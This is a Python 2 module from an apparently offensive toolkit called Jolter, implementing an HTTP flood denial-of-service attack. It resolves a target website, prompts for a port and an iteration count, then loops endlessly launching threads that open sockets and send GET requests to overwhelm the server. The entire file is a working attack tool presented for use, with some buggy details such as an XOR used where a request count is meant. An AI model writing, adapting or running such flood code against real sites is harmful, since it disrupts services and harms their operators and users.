#!/usr/bin/env python2

#:-:-:-:-:-:-#
#   Jolter   #
#:-:-:-:-:-:-#

#This module is a part of Jolter
#https://github.com/code-sploit/jolter 

import sys
import time
import os
import socket
from socket import *
import random
import urllib2
import string
import threading
from colors import *
from threading import *
from time import sleep
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

def http_dos(web):

    print ''
    print ''+O+' [*] Detecting server status of the website...'
    ip = socket.gethostbyname(web)
    time.sleep(0.6)
    print ''+G+' [!] Server IP detected--> '+O+'%s' % (ip)

    print ''+R+' [!] Target website set --> %s' % web
    print '==================================================\n'
    time.sleep(0.4)
    port = raw_input(''+C+' [!] Enter the flood port (eg. 80) :> '+O+'')
    port = int(port)
    print ''+R+' [!] Target port set --> %s' % port
    print '==================================================\n'
    time.sleep(0.4)
    ran = raw_input(''+C+' [!] Enter the no. of iterations (eg. 1000) :> '+O+'')
    ran = int(ran)
    print ''+R+' [!] No of iterations to run set --> %s' % ran
    print '==================================================\n\n'

    global n
    n=0

    print '' + GR +'         Final Summary of the Attack Surface:\n'
    print '' + B + '  +-------------+----------------------------------+'
    print '' + B + '  |   Website   |        \033[1;96m' + web + ''
    print '' + B + '  +-------------+----------------------------------+'
    print '' + B + '  | Attack Type |         \033[1;96mHTTP Fl00D'
    print '' + B + '  +-------------+----------------------------------+'
    print '' + B + '  |     Port    |            \033[1;96m %s' % (port)
    print '' + B + '  +-------------+----------------------------------+'
    print '' + B + '  |  Iterations |          \033[1;96m %s' % (ran)
    print '' + B + '  +-------------+----------------------------------+\n\n'

    def attack():

	    global n
	    ip = socket.gethostbyname( web )
	    print ''+GR+' [*] Preparing for the flood attack....'
	    time.sleep(0.8)
	    print ''+GR+'\n [!] Configuring the GET requests to be sent...'
	    time.sleep(1)
	    msg=str(string.letters+string.digits+string.punctuation)
	    data="".join(random.sample(msg,5))
	    print ''+B+'\n [!] Socket creation initiated...'
	    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	    try:
		n+=1
	        dos.connect((ip, port))
	        dos.send( "GET /%s HTTP/1.1\r\n" % data )
	        print ''+R+"\n [!] Flooding the ip with thousands of GET requests... "
	
	    except:
		print ''+R+"\n [!] No connection! Server maybe down! "
	
	    dos.close()

    m = raw_input(' [!] Press "Enter" to start the attack...\n')

    if m == "":
		
	print ''+B+' [*] Getting everything ready...'
	time.sleep(0.3)
	print ''+GR+' [!] Finalising everything...'
	time.sleep(0.8)
	print ''+R+' [!] Launching the Attack...\n'
	time.sleep(0.8)
        print " [*] Attack started on",web," | ",ip,"\n"
        nn=0
        port = int(port)
        ran = int(ran)
   
	while True:
	  for i in xrange(ran):
	    
	    nn+=1
	    t1 = threading.Thread(target=attack)
	    t1.daemon =True # if thread is exist, it dies
	    print ''+R+'\n [!] Firing up the first thread...\n'
	    t1.start()

	    t2 = threading.Thread(target=attack)
	    t2.daemon =True # if thread is exist, it dies
	    print ''+R+'\n [!] Firing up the second thread...\n'
	    t2.start()
	
	    if nn==100:
	        nn=0
	        time.sleep(0.01)
		if i == ran:
			print O+' [!] Website : '+GR + web
			print O+' [!] Iterations : '+str(ran)
			print O+' [!] Total Requests Sent : '+ str(ran*2^2^2) + '\n'
    else:
	
	print '\n [!] Attack Aborted !\n'

